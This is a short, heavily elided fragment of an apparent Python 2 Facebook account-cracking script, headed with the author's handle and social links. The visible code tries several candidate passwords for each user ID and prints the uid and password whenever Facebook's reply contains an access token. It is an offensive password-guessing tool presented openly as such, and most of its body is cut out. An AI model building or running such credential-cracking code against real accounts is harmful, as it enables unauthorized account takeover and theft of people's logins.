...
Author  : BRAND (MR DEMON)

Github  : PAGLOBRAND

Fb ID   : https://facebook.com/BRANDH3R3

--------------------------------------------

[THE UNB34T4BL3 XHOKR4 MR HANDRIIX]
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in data.text and 'EAAA' in data.text:
                ...
                print ' \x1b[1;32m[HANDRIX-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ...
                if 'access_token' in data.text and 'EAAA' in data.text:
                    ...
                    print ' \x1b[1;32m[HANDRIX-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ...
                    if 'access_token' in data.text and 'EAAA' in data.text:
                        ...
                        print ' \x1b[1;32m[HANDRIX-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ...
                        if 'access_token' in data.text and 'EAAA' in data.text:
                            ...
                            print ' \x1b[1;32m[HANDRIX-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
